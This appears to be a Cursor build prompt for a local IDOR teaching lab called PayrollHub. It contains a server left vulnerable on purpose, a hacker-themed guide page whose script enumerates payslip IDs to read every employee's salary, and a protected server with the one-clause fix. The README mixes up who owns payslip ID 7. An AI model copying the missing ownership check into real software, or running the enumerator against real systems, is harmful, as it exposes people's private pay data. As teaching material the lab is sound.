# Cursor Prompt: IDOR Demo — PayrollHub (Ports 3040–3042)

## Global UI Standard — applies to every server in this lab

| Server type | Theme |
|-------------|-------|
| Attacker server / Attack guide | Clone `DASHBOARD_HTML` from `reverse-tabnabbing/attacker-server.js` — `#0a0a0a` bg, `#00ff41` text, `'Courier New'` font. Copy `<style>` verbatim. |
| Internal / target server | Muted corporate — `#1a1a2e` bg, `#e2e8f0` text |
| Victim servers | Realistic product UI matching their brand |

**Attacker/guide pages — non-negotiable rules:**
- Copy the `<style>` block from `DASHBOARD_HTML` in `reverse-tabnabbing/attacker-server.js` **verbatim**. Never recreate or paraphrase it.
- Body layout: `padding: 2rem` on body. No max-width wrapper div. No centering.
- Panels: use `.flow-box` and `.credentials-panel` classes (defined in that style block). These must be full-width — never add `max-width` to them, not in CSS and not as inline `style` attributes. Only `<p>` text elements may use `max-width` for line-length readability.
- Navigation: **fixed bottom-left `target-switcher` only.** No other open/link buttons anywhere on the page.

---

## Context

**Attack:** Insecure Direct Object Reference (IDOR) — OWASP A01:2021 Broken Access Control  
**App name:** PayrollHub — employee payroll portal  
**Tagline:** "Your payslips, anywhere"  
**Folder:** `demo-attacked/idor/`

PayrollHub lets employees log in and view their payslips. The vulnerable server checks that users are authenticated but never checks that the requested payslip belongs to them. By incrementing the integer ID in the API URL, any employee can read any other employee's salary, tax, and employment details.

**Why it matters:** IDOR is the #1 web vulnerability category (OWASP 2021). It requires zero special tools — just a browser and the ability to change a number in a URL. The fix is a single SQL clause: `AND user_id = ?`. The gap between the vulnerability and the fix illustrates exactly why "authenticated" ≠ "authorized."

---

## Port Layout

| Port | Role | App |
|------|------|-----|
| 3040 | Vulnerable victim | PayrollHub (no ownership check) |
| 3041 | Attack guide | IDOR Lab (hacker terminal) |
| 3042 | Protected victim | PayrollHub (ownership check enforced) |

---

## Port 3040 — Vulnerable PayrollHub

### File: `idor/victim-server.js`

**Dependencies:** `express ^4.18.2`, `better-sqlite3 ^9.0.0`, `cors ^2.8.5`

Enable CORS for the attack guide:
```js
const cors = require('cors');
app.use(cors({ origin: 'http://localhost:3041' }));
```

### Database setup (in-memory SQLite, seeded on start)

```js
const Database = require('better-sqlite3');
const db = new Database(':memory:');

db.exec(`
  CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE,
    password TEXT,
    full_name TEXT,
    department TEXT
  );

  CREATE TABLE payslips (
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    period TEXT,
    gross_pay INTEGER,
    tax_withheld INTEGER,
    net_pay INTEGER,
    annual_salary INTEGER,
    department TEXT,
    FOREIGN KEY (user_id) REFERENCES users(id)
  );

  INSERT INTO users VALUES
    (1, 'alice',  'alice123',  'Alice Chen',      'Engineering'),
    (2, 'bob',    'bob123',    'Bob Martinez',    'Engineering'),
    (3, 'charlie','charlie123','Charlie Kim',     'Management'),
    (4, 'hr',     'hr_admin',  'Dana (HR)',        'Human Resources');

  INSERT INTO payslips VALUES
    (1,  1, 'June 2026',   7083,  1558,  5525,  85000, 'Engineering'),
    (2,  1, 'May 2026',    7083,  1558,  5525,  85000, 'Engineering'),
    (3,  1, 'April 2026',  7083,  1558,  5525,  85000, 'Engineering'),
    (4,  2, 'June 2026',   7667,  1687,  5980,  92000, 'Engineering'),
    (5,  2, 'May 2026',    7667,  1687,  5980,  92000, 'Engineering'),
    (6,  2, 'April 2026',  7667,  1687,  5980,  92000, 'Engineering'),
    (7,  3, 'June 2026',  10417,  2292,  8125, 125000, 'Management'),
    (8,  3, 'May 2026',   10417,  2292,  8125, 125000, 'Management'),
    (9,  3, 'April 2026', 10417,  2292,  8125, 125000, 'Management'),
    (10, 4, 'June 2026',  15000,  3300, 11700, 180000, 'Human Resources'),
    (11, 4, 'May 2026',   15000,  3300, 11700, 180000, 'Human Resources'),
    (12, 4, 'April 2026', 15000,  3300, 11700, 180000, 'Human Resources');
`);
```

### Auth mechanism

```js
const crypto = require('crypto');
const sessions = new Map();

app.use(express.json());

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?')
                  .get(username, password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  const token = crypto.randomBytes(32).toString('hex');
  sessions.set(token, { id: user.id, username: user.username, fullName: user.full_name });
  res.json({ token, user: { id: user.id, username: user.username, fullName: user.full_name } });
});

function requireAuth(req, res, next) {
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : '';
  const session = sessions.get(token);
  if (!session) return res.status(401).json({ error: 'Not authenticated' });
  req.user = session;
  next();
}
```

### Vulnerable endpoints

**`GET /api/payslips`** — lists only the logged-in user's payslips (correct):
```js
app.get('/api/payslips', requireAuth, (req, res) => {
  const payslips = db.prepare('SELECT * FROM payslips WHERE user_id = ?')
                     .all(req.user.id);
  res.json(payslips);
});
```

**`GET /api/payslips/:id`** — ⚠️ VULNERABLE: no ownership check:
```js
app.get('/api/payslips/:id', requireAuth, (req, res) => {
  // ⚠️ Only checks that the user is logged in — not that they OWN this payslip
  const payslip = db.prepare('SELECT * FROM payslips WHERE id = ?')
                    .get(req.params.id);
  if (!payslip) return res.status(404).json({ error: 'Not found' });
  res.json(payslip);
  // payslip.user_id is never compared to req.user.id
});
```

**`GET /api/me`** — returns current user from session:
```js
app.get('/api/me', requireAuth, (req, res) => {
  res.json(req.user);
});
```

**`POST /api/logout`** — deletes session token immediately. Server-side sessions make real logout trivial (contrast with JWT demo which needs a denylist):
```js
app.post('/api/logout', requireAuth, (req, res) => {
  const token = req.headers.authorization.slice(7);
  sessions.delete(token); // instant, complete — no denylist needed
  res.json({ message: 'Logged out' });
});
```

Add a "Sign Out" button at the bottom of the left sidebar:
```html
<button id="btn-logout" style="
  margin-top:auto;width:100%;padding:0.5rem;
  background:transparent;border:1px solid #475569;
  color:#94a3b8;border-radius:4px;cursor:pointer;font-size:0.8rem;
">Sign Out</button>
```

Logout JS (in dashboard page script):
```js
document.getElementById('btn-logout').addEventListener('click', async function() {
  var token = localStorage.getItem('authToken');
  if (token) {
    try { await fetch('/api/logout', { method:'POST', headers:{'Authorization':'Bearer '+token} }); }
    catch(e) {}
  }
  localStorage.removeItem('authToken');
  window.location.href = '/login';
});
```

### UI design — corporate HR portal

Colors: `#f8fafc` background, `#1e293b` sidebar, `#0f172a` text, `#6366f1` accent (indigo).

Layout:
- Left sidebar (`#1e293b`, `220px`): "PayrollHub" logo, nav links (My Payslips, Profile), user avatar + name at bottom
- Top bar: white, thin shadow, breadcrumb "My Payslips"
- Main content: white cards on `#f8fafc` background

**Amber top banner:**
```
⚠ VULNERABLE: /api/payslips/:id has no ownership check — any authenticated user can access any payslip by ID
```

**Payslips list page (`GET /`):**
After login, fetch `GET /api/payslips` and render each as a card:

```
┌─────────────────────────────────────────────────────┐
│ June 2026                               ID: #1      │
│ Net Pay: $5,525.00            Gross: $7,083.00      │
│ Tax Withheld: $1,558.00    Annual Salary: $85,000   │
│                                    [View Details]   │
└─────────────────────────────────────────────────────┘
```

"View Details" opens `/payslip?id=1` (a detail page that calls `GET /api/payslips/1`).

**Login page (`GET /login`):** White centered card. "PayrollHub" heading, username + password fields, "Sign In" button (indigo). Store token in `localStorage.setItem('authToken', data.token)`.

**Critical — login page input CSS:** Both username and password fields must use the same CSS class (e.g. `class="login-input"`) with explicit styles — never rely on browser defaults for `input[type="password"]`, it renders differently without explicit styling:

```css
.login-input {
  width: 100%;
  padding: 0.6rem 0.75rem;
  border: 1px solid #cbd5e1;
  border-radius: 6px;
  font-size: 0.95rem;
  color: #0f172a;
  background: #fff;
  outline: none;
  box-sizing: border-box;
  font-family: inherit;
}
.login-input:focus { border-color: #6366f1; box-shadow: 0 0 0 3px rgba(99,102,241,0.15); }
```

Apply `class="login-input"` to both `<input type="text">` and `<input type="password">`.

**`package.json` scripts:**
```json
{
  "scripts": {
    "victim": "node victim-server.js"
  }
}
```

---

## Port 3041 — IDOR Attack Lab (guide)

### File: `idor/attack-guide-server.js`

Open `reverse-tabnabbing/attacker-server.js`. Find the `DASHBOARD_HTML` constant. Copy its entire `<style>` block **verbatim** — every rule, every value, character for character. Do not rewrite, summarize, or recreate it.

### Page content

**Title:** `🔓 IDOR Attack Lab — PayrollHub`

**Section 1 — Credentials** (`.credentials-panel` table):

| Field | Value |
|-------|-------|
| Target | http://localhost:3040 |
| Username | alice |
| Password | alice123 |
| Alice's payslip IDs | 1, 2, 3 |
| Bob's payslip IDs | 4, 5, 6 |
| Charlie (manager) IDs | 7, 8, 9 |
| HR director IDs | 10, 11, 12 |

**Section 2 — Step-by-step login + manual IDOR** (`.flow-box`)

Heading: `Step 1 — Login as Alice`

Login panel:
```html
<div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap">
  <input class="field" id="login-user" value="alice" style="width:120px">
  <input class="field" id="login-pass" value="alice123" type="password" style="width:120px">
  <button class="demo-btn" id="btn-login">Login → :3040</button>
</div>
<div class="result-banner" id="login-result"></div>
<div style="margin-top:0.5rem;font-size:0.78rem;color:#64748b">Token stored — all requests below will use it automatically.</div>
```

Heading: `Step 2 — Fetch Your Own Payslip`

```html
<div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap">
  <label style="font-size:0.82rem;color:#94a3b8">Payslip ID:</label>
  <input class="field" id="payslip-id" value="1" style="width:80px" type="number" min="1" max="20">
  <button class="demo-btn" id="btn-fetch">GET /api/payslips/:id</button>
</div>
<div class="result-banner" id="fetch-result"></div>
<pre class="decoded-box" id="fetch-output" style="min-height:100px">Response will appear here</pre>
```

Below the output, show the live SQL being run:
```html
<div class="flow-box" style="margin-top:0.75rem">
  <strong>SQL EXECUTED ON VULNERABLE SERVER</strong><br>
  <pre id="sql-display">SELECT * FROM payslips WHERE id = <span id="sql-id" style="color:#ff6b6b">1</span>
-- ⚠️ No "AND user_id = ?" — ownership never verified
-- Any authenticated user can request any ID</pre>
</div>
```

Update `#sql-id` in real time as the ID input changes.

**Section 3 — Automated Enumerator** (`.flow-box`)

Heading: `⚡ Auto-Enumerate All Payslips`

```html
<p style="font-size:0.85rem;color:#94a3b8;max-width:640px">
  Tries IDs 1–12 in sequence and collects every payslip returned. In a real engagement this
  reveals every employee's salary in seconds.
</p>
<div style="display:flex;gap:0.5rem;align-items:center;margin-bottom:0.75rem">
  <button class="demo-btn" id="btn-enumerate">⚡ Enumerate IDs 1–12</button>
  <span id="enum-progress" style="font-size:0.82rem;color:#64748b"></span>
</div>
<div class="result-banner" id="enum-result"></div>
```

After enumeration, render results in a `.credentials-panel` table:

| ID | Owner's user_id | Period | Annual Salary | Net Pay | Department |
|----|----------------|--------|---------------|---------|------------|

Color-code rows: alice's payslips (`user_id=1`) in green, all others in amber/red to visually show cross-user access.

**Section 4 — Root Cause** (`.flow-box`)

Heading: `🔍 Root Cause`

```
VULNERABLE query (port 3040):
  SELECT * FROM payslips WHERE id = ?
  ↑
  Only checks: does this payslip exist?
  Does NOT check: does it belong to the requesting user?

PROTECTED query (port 3042):
  SELECT * FROM payslips WHERE id = ? AND user_id = ?
  ↑                                       ↑
  Does payslip exist?          Does it belong to YOU?

The fix is literally one SQL clause.
Authentication  ≠  Authorization
"Are you logged in?"  ≠  "Do you own this resource?"
```

**Navigation:** Fixed bottom-left `target-switcher` only:
- `Vulnerable (:3040)` → `window.open('http://localhost:3040')`
- `Protected (:3042)` → `window.open('http://localhost:3042')`

### JavaScript

```js
let authToken = null;

function showBanner(id, type, msg) {
  var el = document.getElementById(id);
  el.className = 'result-banner ' + type;
  el.textContent = msg;
  el.style.display = 'block';
}

// Update live SQL display as ID changes
document.getElementById('payslip-id').addEventListener('input', function() {
  document.getElementById('sql-id').textContent = this.value || '?';
});

// Login
document.getElementById('btn-login').addEventListener('click', async function() {
  try {
    var res = await fetch('http://localhost:3040/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: document.getElementById('login-user').value,
        password: document.getElementById('login-pass').value
      })
    });
    var data = await res.json();
    if (!res.ok) { showBanner('login-result', 'failure', '✗ ' + data.error); return; }
    authToken = data.token;
    showBanner('login-result', 'success', '✓ Logged in as ' + data.user.username + ' (id: ' + data.user.id + ')');
  } catch(e) { showBanner('login-result', 'failure', '✗ ' + e.message); }
});

// Fetch single payslip
document.getElementById('btn-fetch').addEventListener('click', async function() {
  if (!authToken) { showBanner('fetch-result', 'failure', '✗ Login first'); return; }
  var id = document.getElementById('payslip-id').value;
  try {
    var res = await fetch('http://localhost:3040/api/payslips/' + id, {
      headers: { 'Authorization': 'Bearer ' + authToken }
    });
    var data = await res.json();
    document.getElementById('fetch-output').textContent = JSON.stringify(data, null, 2);
    if (res.ok) {
      showBanner('fetch-result', 'success', '✓ Payslip #' + id + ' returned — user_id: ' + data.user_id + ', annual_salary: $' + data.annual_salary.toLocaleString());
    } else {
      showBanner('fetch-result', 'failure', '✗ ' + data.error);
    }
  } catch(e) { showBanner('fetch-result', 'failure', '✗ ' + e.message); }
});

// Auto-enumerator
document.getElementById('btn-enumerate').addEventListener('click', async function() {
  if (!authToken) { showBanner('enum-result', 'failure', '✗ Login first'); return; }
  var progress = document.getElementById('enum-progress');
  var results = [];

  for (var i = 1; i <= 12; i++) {
    progress.textContent = 'Trying ID ' + i + '/12...';
    try {
      var res = await fetch('http://localhost:3040/api/payslips/' + i, {
        headers: { 'Authorization': 'Bearer ' + authToken }
      });
      if (res.ok) {
        var data = await res.json();
        results.push({ id: i, ...data });
      }
    } catch(e) { /* skip */ }
    // small delay so the UI updates
    await new Promise(function(r) { setTimeout(r, 50); });
  }

  progress.textContent = '';
  showBanner('enum-result', 'success', '✓ Found ' + results.length + ' payslips across ' + new Set(results.map(function(r){ return r.user_id; })).size + ' users');

  // Build result table
  var table = '<table style="width:100%;border-collapse:collapse;font-size:0.82rem;margin-top:1rem">';
  table += '<tr style="color:#64748b;border-bottom:1px solid #1a3a1a"><th style="text-align:left;padding:0.4rem 0.6rem">ID</th><th>user_id</th><th>Period</th><th>Annual Salary</th><th>Net Pay</th><th>Dept</th></tr>';
  results.forEach(function(r) {
    var isOwn = r.user_id === 1; // alice = user_id 1
    var rowColor = isOwn ? '#052e16' : '#450a0a';
    var textColor = isOwn ? '#4ade80' : '#fca5a5';
    table += '<tr style="background:' + rowColor + ';color:' + textColor + '">';
    table += '<td style="padding:0.4rem 0.6rem">#' + r.id + '</td>';
    table += '<td style="padding:0.4rem 0.6rem">' + r.user_id + (isOwn ? ' (you)' : ' ⚠️') + '</td>';
    table += '<td style="padding:0.4rem 0.6rem">' + r.period + '</td>';
    table += '<td style="padding:0.4rem 0.6rem">$' + r.annual_salary.toLocaleString() + '</td>';
    table += '<td style="padding:0.4rem 0.6rem">$' + r.net_pay.toLocaleString() + '</td>';
    table += '<td style="padding:0.4rem 0.6rem">' + r.department + '</td>';
    table += '</tr>';
  });
  table += '</table>';

  // Inject table after the enum-result banner
  var existing = document.getElementById('enum-table');
  if (existing) existing.remove();
  var div = document.createElement('div');
  div.id = 'enum-table';
  div.innerHTML = table;
  document.getElementById('enum-result').after(div);
});
```

Also add the extra CSS (appended after verbatim block):
```css
input.field {
  background: #111;
  border: 1px solid #1a3a1a;
  color: #00ff41;
  font-family: 'Courier New', Courier, monospace;
  font-size: 0.82rem;
  padding: 0.4rem 0.6rem;
  border-radius: 4px;
}
.result-banner {
  padding: 0.6rem 1rem;
  border-radius: 4px;
  font-size: 0.82rem;
  margin-top: 0.75rem;
  display: none;
}
.result-banner.success { background: #052e16; border: 1px solid #16a34a; color: #4ade80; }
.result-banner.failure { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
.result-banner.info    { background: #0c1a2e; border: 1px solid #1e40af; color: #93c5fd; }
pre.decoded-box {
  background: #0a0a0a;
  border: 1px solid #1a3a1a;
  border-radius: 4px;
  padding: 0.75rem;
  font-size: 0.78rem;
  color: #cbd5e1;
  white-space: pre-wrap;
  word-break: break-all;
  margin-top: 0.5rem;
}
```

**`package.json` scripts:**
```json
{
  "scripts": { "attacker": "node attack-guide-server.js" }
}
```

---

## Port 3042 — Protected PayrollHub

### File: `idor/victim-protected-server.js`

Identical UI to port 3040. Same database setup. Same auth mechanism. Same routes.

**Only change:** the single payslip endpoint adds `AND user_id = ?`:

```js
app.get('/api/payslips/:id', requireAuth, (req, res) => {
  // ✅ Ownership check: id must belong to the requesting user
  const payslip = db.prepare(
    'SELECT * FROM payslips WHERE id = ? AND user_id = ?'
  ).get(req.params.id, req.user.id);

  if (!payslip) {
    // Return 404 — not 403. Don't confirm the resource exists.
    return res.status(404).json({ error: 'Payslip not found' });
  }
  res.json(payslip);
});
```

**Why 404 and not 403?**
Returning 403 confirms the resource exists at that ID — the attacker now knows ID 7 belongs to someone. 404 reveals nothing. This is a secondary defense-in-depth principle: don't leak object existence through status codes.

**Green top banner:**
```
✅ PROTECTED: /api/payslips/:id enforces AND user_id = ? — ownership verified on every request
```

Show a "Security" badge in the top bar.

When a cross-user ID is requested, show in the UI:
```
404 — Payslip not found
(If you're seeing this on the protected server, the ownership check worked. 
 This payslip exists but doesn't belong to you.)
```

**`package.json` scripts:**
```json
{
  "scripts": { "victim-protected": "node victim-protected-server.js" }
}
```

---

## Shared `package.json` at `idor/`

```json
{
  "name": "idor-demo",
  "version": "1.0.0",
  "scripts": {
    "victim":           "node victim-server.js",
    "attacker":         "node attack-guide-server.js",
    "victim-protected": "node victim-protected-server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "better-sqlite3": "^9.0.0",
    "cors": "^2.8.5"
  }
}
```

---

## README at `idor/README.md`

### Attack Flow

```
Attacker logs in as alice (user_id = 1)
        ↓
Attacker sends: GET /api/payslip/7   ← ID belongs to bob
        ↓
PayrollHub (3040): SELECT * FROM payslips WHERE id = 7
  (no AND user_id = ? check)
        ↓
Bob's payslip returned to alice — $92,000 salary exposed
        ↓
Enumerate IDs 1–12 → all 4 employees' salaries exposed in < 1 second
```

### What this demonstrates

The server checks authentication ("are you logged in?") but skips authorization ("do you own this resource?"). Because payslip IDs are sequential integers, an attacker who can see their own payslip at `/api/payslips/1` can read every other employee's payslip by incrementing the number.

### Vulnerable line

`idor/victim-server.js`:
```js
// ⚠️ No ownership check — user_id is never verified
const payslip = db.prepare('SELECT * FROM payslips WHERE id = ?').get(id);
```

### The fix

```js
// ✅ Must match BOTH the id AND the requesting user
const payslip = db.prepare(
  'SELECT * FROM payslips WHERE id = ? AND user_id = ?'
).get(id, req.user.id);
```

### Run the demo

```bash
cd demo-attacked/idor
npm install
npm run victim           # terminal 1 → localhost:3040
npm run attacker         # terminal 2 → localhost:3041
npm run victim-protected # terminal 3 → localhost:3042
```

### Walkthrough

1. Open **localhost:3041**
2. Click **Login → :3040** as alice
3. Fetch payslip ID **1** → alice's own payslip (expected)
4. Fetch payslip ID **7** → Charlie's payslip, annual salary $125,000 (IDOR)
5. Click **⚡ Enumerate IDs 1–12** → all 12 payslips returned, all 4 salary bands exposed
6. Switch to **:3042**, log in as alice, fetch ID **7** → 404 (ownership check blocks it)

### Key concepts

**Authentication vs Authorization:** Being logged in proves identity. It does not prove ownership of a resource. Every resource endpoint must check both.

**Why 404 not 403:** A 403 response tells the attacker the object exists at that ID. A 404 reveals nothing — the same response whether the ID doesn't exist or belongs to someone else.

**Sequential IDs make IDOR trivial:** UUIDs raise the bar (not a fix, but harder to enumerate). The real fix is always the server-side ownership check.
